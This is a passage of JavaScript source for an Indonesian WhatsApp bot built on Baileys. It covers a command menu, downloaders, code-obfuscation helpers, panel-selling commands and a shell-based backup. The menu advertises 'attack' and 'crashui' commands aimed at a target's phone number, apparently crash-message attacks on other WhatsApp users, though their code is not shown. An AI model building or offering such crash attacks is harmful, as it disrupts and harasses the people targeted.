require("./settings/settings")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@whiskeysockets/baileys")
const fs = require('fs')
const settings = require('./settings/settings.js');
const util = require('util')
const body = m.text || "";
const axios = require('axios');
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const cheerio = require('cheerio')
const speed = require('performance-now')
const os = require('os')
const path = require('path')
const archiver = require('archiver')
const timestampp = speed();
const crypto = require('crypto');
const settingsPath = './settings/owner.js';
require(settingsPath); 
const latensi = speed() - timestampp
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom, formatp } = require('./serverside/libary/myfunc')
const { spotifyDown } = require('./serverside/libary/spotify')
const prem = require("./serverside/libary/premium");
const { ytdl } = require('./serverside/libary/ytdl');
let premium = JSON.parse(fs.readFileSync('./serverside/system/premium.json'));

module.exports = async (Aanz, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""


const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Aanz.user.id.split(':')[0]+'@s.whatsapp.net' || Aanz.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Aanz.decodeJid(Aanz.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const isPrem = isCreator ? true : prem.checkPremiumUser(m.sender, premium)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''

const groupMetadata = m.isGroup ? await Aanz.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false


// Database path
let linkRegex = /https:\/\/open\.spotify\.com\/track\/[0-9A-Za-z]+/i;


// Console message
if (m.message) {
console.log(
    chalk.inverse(' 📬  [ Message ] ') + 
    ' ' + 
    chalk.black.bgGreen(new Date().toLocaleString()) + 
    ' ' + 
    chalk.black.bgBlue(budy || m.mtype) + '\n' +
    chalk.magenta('📣 Dari: ') + chalk.green(pushname) + ' ' + chalk.yellow(`(${m.sender})`) + '\n' +
    chalk.bgMagenta('📍 Di: ') + chalk.green(m.isGroup ? 'Grup' : 'Private Chat') + ' ' + chalk.green(from) + 
    '\n' + chalk.greenBright('✧──────── AanzzzCuyxzz ─────────✧')
   );
 }

// Self & public
if (!Aanz.public) {
if (!m.key.fromMe) return
} 

// Function Sinkron
function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }



    
    
// Variable 

const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": 'AanzCuyxzzz-V2',
                    "jpegThumbnail": ''
                          }
                        }
                      }


const totalFitur = () =>{
            var mytext = fs.readFileSync("./Aanz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        
const imageUrls = [
        'https://files.catbox.moe/7abrvq.jpg',
        'https://files.catbox.moe/7abrvq.jpg'
    ];

    // Randomized Image © AanzzzCuyxzz
    const randomIndex = Math.floor(Math.random() * imageUrls.length);
    const randomImageUrl = imageUrls[randomIndex];

const reply = async (teks) => {
return Aanz.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `AanzCuyxzzz-V2`,
body: `🔴 Active : ${runtime(process.uptime())}`,
previewType: "VIDEO",
thumbnail: randomImageUrl,
sourceUrl: `https://files.catbox.moe/7abrvq.jpg`,
mediaUrl: `https://files.catbox.moe/7abrvq.jpg`
}
},
text: teks
}, {
quoted: m
})
}


// Function Asinkron ( Async )
async function deobfuscateCode(text) {
        const result = deobfuscate(text);
        return result;
}
 let fiturNew = {};
try {
    fiturNew = JSON.parse(fs.readFileSync('./fiturnew.json', 'utf8'));
} catch (e) {
    console.error("Terjadi kesalahan saat membaca fiturnew.json", e);
    fiturNew = { fitur: [] }; // Jika file tidak ada, inisialisasi sebagai array kosong
}  
    

async function EncryptJs(code) {
    let res = await fetch(`https://api.alyachan.dev/api/obfuscator?code=${code}&apikey=keymu`);
    let jsonResponse = await res.json(); // Mendapatkan respons JSON

    if (jsonResponse.status) {
        return jsonResponse.data; // Mengembalikan bagian data dari respons (kode yang telah diobfuscate)
    } else {
        throw new Error(jsonResponse.message || 'Terjadi kesalahan dalam obfuscation');
    }
}


async function EncryptJs2(code) {
    let res = await fetch(`https://ai.xterm.codes/api/tools/js-protector?code=${code}&key=keymu`);
    let jsonResponse = await res.json(); // Mendapatkan respons JSON
    return jsonResponse.data; // Mengembalikan bagian data dari respons
}


    
switch(command) {
case 'menu':
{
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 const videoUrls = settings.videoUrls;
 const currentVideoUrl = videoUrls[global.menuVideoIndex];

 global.menuVideoIndex = (global.menuVideoIndex + 1) % videoUrls.length;

 const emojiReaction = '♨️';

 await Aanz.sendMessage(m.chat, {
 react: {
 text: emojiReaction,
 key: m.key,
 },
 });

 let menu = `

${global.kiw}── 「 Iɴғᴏʀᴍᴀsɪ AᴀɴᴢCᴜʏxᴢᴢᴢ 」 ──${global.kiw}
▸ ${global.kiw}Nᴀᴍᴀ Oᴡɴᴇʀ : ${global.namaowner}${global.kiw}
▸ ${global.kiw}Nᴀᴍᴀ Bᴏᴛ : ${global.namabot}${global.kiw}
▸ ${global.kiw}Lɪʙʀᴀʀʏ : @Whiskeysockets/baileys${global.kiw}
▸ ${global.kiw}Aᴋᴛɪ : ${runtime(process.uptime())}${global.kiw}
▸ ${global.kiw}Tᴏᴛᴀʟ Fɪᴛᴜʀ : ${totalFitur()}${global.kiw}
${global.kiw}───────────────────${global.kiw}

> *Pᴇʀᴋᴇɴᴀʟᴋᴀɴ Sᴀʏᴀ Aᴅᴀʟᴀʜ AᴀɴᴢCᴜʏxᴢᴢᴢ V2 Yᴀɴɢ Sɪᴀᴘ Mᴇᴍʙᴀɴᴛᴜ Aɴᴅᴀ 24Jᴀᴍ!!*
 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
${global.kiw}── 「 Bᴜʏ Oᴛᴏᴍᴀᴛɪs Oʀᴋᴜᴛ 」 ──${global.kiw}
- ʙᴜʏᴘᴀɴᴇʟ *(Oᴛᴏᴍᴀᴛɪs)*
- ʙᴜʏᴀᴅᴍɪɴᴘᴀɴᴇʟ *(Otomatis)*
- ʙᴜʏʀᴇsᴇʟʟᴇʀᴘᴀɴᴇʟ *(Oᴛᴏᴍᴀᴛɪs)*
- ʙᴀᴛᴀʟʙᴇʟɪ *(Mᴇᴍʙᴀᴛᴀʟᴋᴀɴ Pᴇᴍʙᴇʟɪᴀɴ)*
- ǫʀɪs *(Dᴇᴘᴏsɪᴛ Oʀᴋᴜᴛ Oᴛᴏᴍᴀᴛɪs)*

${global.kiw}── 「 Tᴏᴏʟs 」 ──${global.kiw}
- ᴛᴏᴜʀʟ *(Rᴇᴘʟʏ ɪᴍᴀɢᴇ)*
- ɢᴇᴛ *(Iɴᴘᴜᴛ URL)*
- ᴇɴᴄʀʏᴘᴛ *(Iɴᴘᴜᴛ ᴄᴏᴅᴇ)*
- ᴇɴᴄʀʏᴘᴛᴠ2 *(Iɴᴘᴜᴛ ᴄᴏᴅᴇ)*
- ᴅᴇᴄʀʏᴘᴛ *(Iɴᴘᴜᴛ ᴄᴏᴅᴇ)*
- sᴛɪᴄᴋᴇʀ *(Rᴇᴘʟʏ Iᴍᴀɢᴇ/Vɪᴅᴇᴏ)*
- sʜᴏʀᴛʟɪɴᴋ *(Iɴᴘᴜᴛ Uʀʟ)*
- ɢɪᴘʜʏ *(Iɴᴘᴜᴛ Gɪғ Rᴀsɪᴏ)*
- ᴄᴜᴀᴄᴀ *(Iɴᴘᴜᴛ Kᴏᴛᴀ)*
- ᴄᴇᴋɪᴘ *(Iɴᴘᴜᴛ Iᴘ)*
- ᴛʀᴀɴsʟᴀᴛᴇ *(Iɴᴘᴜᴛ Bᴀʜᴀsᴀ)*
- ᴄʜᴀᴛʙᴏᴛ *(Iɴᴘᴜᴛ Tᴇᴋs)*

${global.kiw}── 「 Dᴏᴡɴʟᴏᴀᴅᴇʀ 」 ──${global.kiw}
- sᴘᴏᴛɪғʏ *(URL ᴍᴜsɪᴄ)*
- ᴛɪᴋᴛᴏᴋ *(URL Tɪᴋᴛᴏᴋ)*
- ᴘʟᴀʏ *(Jᴜᴅᴜʟ ʟᴀɢᴜ)*
- ᴍᴇᴅɪᴀғɪʀᴇ *(Iɴᴘᴜᴛ ʟɪɴᴋ)*

${global.kiw}── 「 BᴜɢMᴇɴᴜ 」 ──${global.kiw}
- ᴀᴛᴛᴀᴄᴋ *(Nᴏᴍᴏʀ Tᴀʀɢᴇᴛ)*
- ᴄʀᴀsʜᴜɪ *(Nᴏᴍᴏʀ Tᴀʀɢᴇᴛ)*

${global.kiw}── 「 Oᴡɴᴇʀ 」 ──${global.kiw}
- ʙᴀᴄᴋᴜᴘ *(Bᴀᴄᴋᴜᴘ Sᴄʀɪᴘᴛ)*
- ᴄʟᴇᴀʀ *(Sᴇssɪᴏɴ)*
- sᴇʟғ *(Pʀɪʙᴀᴅɪ sᴀᴊᴀ)*
- ᴘᴜʙʟɪᴄ *(Uɴᴛᴜᴋ sᴇᴍᴜᴀ)*
- ᴀᴅᴅᴏᴡɴᴇʀ *(Mᴇɴᴀᴍʙᴀʜᴋᴀɴ Oᴡɴᴇʀ)*
- ᴅᴇʟᴏᴡɴᴇʀ  *(Mᴇɴɢʜᴀᴘᴜs Oᴡɴᴇʀ)*
- ʟɪsᴛᴏᴡɴᴇʀ  *(Lɪsᴛ Oᴡɴᴇʀ)*
- ᴀᴅᴅᴘʀᴇᴍ *(Iɴᴘᴜᴛ ɴᴏᴍᴏʀ)*
- ᴅᴇʟᴘʀᴇᴍ *(Iɴᴘᴜᴛ ɴᴏᴍᴏʀ)*
- ɢᴇᴛᴄᴀsᴇ *(Lɪʜᴀᴛ ғɪᴛᴜʀ)*
- ʀᴇɴᴀᴍᴇᴄᴀsᴇ *(Uʙᴀʜ ɴᴀᴍᴀ ғɪᴛᴜʀ)*
- ᴀᴅᴅᴄᴀsᴇ *(Tᴀᴍʙᴀʜ ғɪᴛᴜʀ)*
- ᴅᴇʟᴄᴀsᴇ *(Hᴀᴘᴜs ғɪᴛᴜʀ)*
- ɢᴇᴛғᴜɴᴄ *(Lɪʜᴀᴛ ғᴜɴɢsɪ)*
- ᴇᴅɪᴛᴄᴀsᴇ *(Eᴅɪᴛ sᴛʀᴜᴋᴛᴜʀ)*
- sᴇᴛᴘᴘʙᴏᴛ *(Uʙᴀʜ Fᴏᴛᴏ ᴘʀᴏғɪʟ ʙᴏᴛ)*
- ғɪᴛᴜʀɴᴇᴡ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Fɪᴛᴜʀ Nᴇᴡ)*
- ᴀᴅᴅғɪᴛᴜʀ *(Mᴇɴᴀᴍʙᴀʜᴋᴀɴ Fɪᴛᴜʀ Kᴇ Lɪsᴛ)*
- ᴄʟᴇᴀʀғɪᴛᴜʀ *(Mᴇɴɢʜᴀᴘᴜs Sᴇᴍᴜᴀ Fɪᴛᴜʀ)*
- ᴅᴏɴᴇ *(Iɴᴘᴜᴛ Dᴀᴛᴀ Bᴀʀᴀɴɢ)*
- ᴘᴀʏᴍᴇɴᴛ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Pᴀʏ Oᴡɴᴇʀ)*

${global.kiw}── 「 GʀᴏᴜᴘMᴇɴᴜ 」 ──${global.kiw}
- ᴏᴘᴇɴɢʀᴏᴜᴘ *(Mᴇᴍʙᴜᴋᴀ Gʀᴏᴜᴘ)*
- ᴄʟᴏsᴇɢʀᴏᴜᴘ *(Mᴇɴᴛᴜᴛᴜᴘ Gʀᴏᴜᴘ)*
- sᴇᴛᴘᴘɢʙ *(Uʙᴀʜ ғᴏᴛᴏ Gʀᴏᴜᴘ)*
- sᴇᴛᴅᴇᴋs *(Uʙᴀʜ Dᴇᴋsʀɪᴘsɪ Gʀᴏᴜᴘ)*
- sᴇᴛɴᴀᴍᴀɢʙ *(Uʙᴀʜ Nᴀᴍᴀ Gʀᴏᴜᴘ)*
- ᴋɪᴄᴋ *(Mᴇɴɢᴇʟᴜᴀʀᴋᴀɴ ᴍᴇᴍʙᴇʀ Gʀᴏᴜᴘ)*
- ʜɪᴅᴇᴛᴀɢ *(Tᴀɢ Sᴇᴍᴜᴀ Mᴇᴍʙᴇʀ Gʀᴏᴜᴘ)*
- ʟɪɴᴋɢᴄ *(Mᴇɴɢᴀᴍʙɪʟ Lɪɴᴋ Gʀᴏᴜᴘ)*

${global.kiw}── 「 Cᴘᴀɴᴇʟ V1 」 ──${global.kiw}
- ᴜᴘᴅᴏᴍᴀɪɴ *(Lɪɴᴋ Dᴏᴍᴀɪɴʏᴀ)*
- ᴜᴘᴀᴘɪᴋᴇʏ *(Lɪɴᴋ Aᴘɪᴋᴇʏɴʏᴀ)*
- ᴜᴘᴄᴀᴘɪᴋᴇʏ *(ʟɪɴᴋ Cᴀᴘɪᴋᴇʏɴʏᴀ)*
- ʟɪɴᴋsᴇʀᴠᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴀᴛᴀ Sᴇʀᴠᴇʀ)*
- ᴄᴘᴀɴᴇʟ *(Mᴇʟɪʜᴀᴛ Lɪsᴛ Rᴀᴍ)*
- ᴄᴀᴅᴍɪɴ *(Usᴇʀ-Nᴏᴍᴏʀ)*
- ʟɪsᴛᴀᴅᴍɪɴ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Aᴅᴍɪɴ)*
- ʟɪsᴛsᴇʀᴠᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Sᴇʀᴠᴇʀ)*
- ʟɪsᴛᴜsᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Usᴇʀ)*
- ᴅᴇʟᴀᴅᴍɪɴ *(Mᴇɴɢʜᴀᴘᴜs Aᴅᴍɪɴ)*
- ᴅᴇʟsᴇʀᴠᴇʀ *(Mᴇɴɢʜᴀᴘᴜs Sᴇʀᴠᴇʀ)*
- ᴅᴇʟᴜsᴇʀ *(Mᴇɴɢʜᴀᴘᴜs Usᴇʀ)*
- ᴄʟᴇᴀʀᴀᴅᴍɪɴ *(Iᴅ Aᴅᴍɪɴ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀsᴇʀᴠᴇʀ *(Iᴅ Sᴇʀᴠᴇʀ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀᴜsᴇʀ *(Mᴇɴɢʜᴀᴘᴜs Aʟʟ Usᴇʀ Kᴇᴄᴜᴀʟɪ Aᴅᴍɪɴ)*

${global.kiw}── 「 Cᴘᴀɴᴇʟ V2 」 ──${global.kiw}
- ᴜᴘᴅᴏᴍᴀɪɴ2 *(Lɪɴᴋ Dᴏᴍᴀɪɴʏᴀ)*
- ᴜᴘᴀᴘɪᴋᴇʏ2 *(Lɪɴᴋ Aᴘɪᴋᴇʏɴʏᴀ)*
- ᴜᴘᴄᴀᴘɪᴋᴇʏ2 *(ʟɪɴᴋ Cᴀᴘɪᴋᴇʏɴʏᴀ)*
- ʟɪɴᴋsᴇʀᴠᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴀᴛᴀ Sᴇʀᴠᴇʀ)*
- ᴄᴘᴀɴᴇʟ *(Mᴇʟɪʜᴀᴛ Lɪsᴛ Rᴀᴍ)*
- ᴄᴀᴅᴍɪɴ2 *(Usᴇʀ-Nᴏᴍᴏʀ)*
- ʟɪsᴛᴀᴅᴍɪɴ2 *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Aᴅᴍɪɴ)*
- ʟɪsᴛsᴇʀᴠᴇʀ2 *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Sᴇʀᴠᴇʀ)*
- ʟɪsᴛᴜsᴇʀ2 *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Usᴇʀ)*
- ᴅᴇʟᴀᴅᴍɪɴ2 *(Mᴇɴɢʜᴀᴘᴜs Aᴅᴍɪɴ)*
- ᴅᴇʟsᴇʀᴠᴇʀ2 *(Mᴇɴɢʜᴀᴘᴜs Sᴇʀᴠᴇʀ)*
- ᴅᴇʟᴜsᴇʀ2 *(Mᴇɴɢʜᴀᴘᴜs Usᴇʀ)*
- ᴄʟᴇᴀʀᴀᴅᴍɪɴ2 *(Iᴅ Aᴅᴍɪɴ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀsᴇʀᴠᴇʀ2 *(Iᴅ Sᴇʀᴠᴇʀ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀᴜsᴇʀ2 *(Mᴇɴɢʜᴀᴘᴜs Aʟʟ Usᴇʀ Kᴇᴄᴜᴀʟɪ Aᴅᴍɪɴ)*

${global.kiw}── 「 Cᴘᴀɴᴇʟ V3 」 ──${global.kiw}
- ᴜᴘᴅᴏᴍᴀɪɴ3 *(Lɪɴᴋ Dᴏᴍᴀɪɴ)*
- ᴜᴘᴀᴘɪᴋᴇʏ3 *(Lɪɴᴋ Aᴘɪᴋᴇʏ)*
- ᴜᴘᴄᴀᴘɪᴋᴇʏ3 *(Lɪɴᴋ Cᴀᴘɪᴋᴇʏ)*
- ʟɪɴᴋsᴇʀᴠᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Dᴀᴛᴀ Sᴇʀᴠᴇʀ)*
- ᴄᴘᴀɴᴇʟ *(Mᴇʟɪʜᴀᴛ Lɪsᴛ Rᴀᴍ)*
- ᴄᴀᴅᴍɪɴ3 *(Usᴇʀ-Nᴏᴍᴏʀ)*
- ʟɪsᴛᴀᴅᴍɪɴ3 *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Aᴅᴍɪɴ)*
- ʟɪsᴛsᴇʀᴠᴇʀ3 *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Sᴇʀᴠᴇʀ)*
- ʟɪsᴛᴜsᴇʀ3 *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Usᴇʀ)*
- ᴅᴇʟᴀᴅᴍɪɴ3 *(Mᴇɴɢʜᴀᴘᴜs Aᴅᴍɪɴ)*
- ᴅᴇʟsᴇʀᴠᴇʀ3 *(Mᴇɴɢʜᴀᴘᴜs Sᴇʀᴠᴇʀ)*
- ᴅᴇʟᴜsᴇʀ3 *(Mᴇɴɢʜᴀᴘᴜs Usᴇʀ)*
- ᴄʟᴇᴀʀᴀᴅᴍɪɴ3 *(Iᴅ Aᴅᴍɪɴ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀsᴇʀᴠᴇʀ3 *(Iᴅ Sᴇʀᴠᴇʀ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀᴜsᴇʀᴇʀ3 *(Mᴇɴɢʜᴀᴘᴜs Aʟʟ Usᴇʀ Kᴇᴄᴜᴀʟɪ Aᴅᴍɪɴ)*
> *_© Developer AanzCuyxzzz_*
`;

 await Aanz.sendMessage(m.chat, {
 video: {
 url: currentVideoUrl,
 },
 caption: menu,
 gifPlayback: true,
 gifAttribution: 1,
 contextInfo: {
 mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: true,
 title: '𐙚 𝐀𝐚𝐧𝐳𝐂𝐮𝐲𝐱𝐳𝐳𝐳 - V2',
 body: 'Simple Bot WhatsApp',
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 }, { quoted: fkontak });
}
break;
      
case 'get': {
if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!text) return m.reply("Please Input url.\nExample: .get https://e.top4top.io/p_3229zf3gp0.jpg");
try {
var check = await fetchJson(text);
let jsonContent = JSON.stringify(check, null, 2);
await Aanz.sendMessage(m.chat, { document: Buffer.from(jsonContent, 'utf-8'), fileName: 'index.html', mimetype: 'text/html' }, { quoted: m, caption: 'Sukses Fetching' });
    } catch (e) {
        return m.reply(e.toString());
    }
}
break;

case 'sc':
case 'script':
m.reply(`Halo! aku menggunakan script dari Aanz`)
break


case 'play': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!text) return m.reply(`*Example:* ${prefix + command} phdotograph`)
let search = await yts(text);
let telaso = search.all[0].url;
var responsek = await ytdl(telaso)
var puki = responsek.data.mp3
Aanz.sendMessage(m.chat, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "kiuu.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
}
break
case 'backup':{
if (!isCreator) return m.reply('You do not have permission to access this feature.');
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await Aanz.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break        

case 'tourl': {
    if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
Aanz.sendMessage(from, {
react: {
text: '🎁',
key: m.key
}
});
let media = await q.download()
let uploadImage = require('./serverside/libary/catmoe')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
m.reply(`Your Link : ${link}\nExpired Date : Liftime`)
}
break
case 'spotify':
